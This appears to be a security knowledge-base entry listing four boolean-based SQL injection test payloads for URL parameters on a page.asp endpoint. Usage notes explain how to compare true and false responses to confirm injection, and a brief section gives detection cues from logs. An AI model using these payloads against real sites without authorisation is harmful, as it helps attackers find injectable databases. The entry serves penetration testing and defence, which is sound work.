---
id: 5f71ccfe-9018-4ec2-a52f-0892461ced0f
name: SQL-Injection-Logic-Test-Payloads
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:36.110408+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - sqli
  - boolean
  - logic-test
validated: true
---

# SQL-Injection-Logic-Test-Payloads

## Code

```sql
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```

## Description

Boolean-based payloads to test SQLi by forcing always-true or always-false conditions, observing if the application response changes accordingly.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Static URL examples; replace page.asp with target endpoint | id=1 or 1=1 |

## Usage

Append to URLs (e.g., ?id=1' or 1=1 --) and compare: true payloads dump data, false return empty results, confirming injection.

## Detection

- Differential responses to boolean inputs.
- Logs of OR/AND in query parameters.
- Time-based or error-based variants for blind SQLi.

## Related

- [[procedures/SQL-Injection-Entry-Point-Detection]]
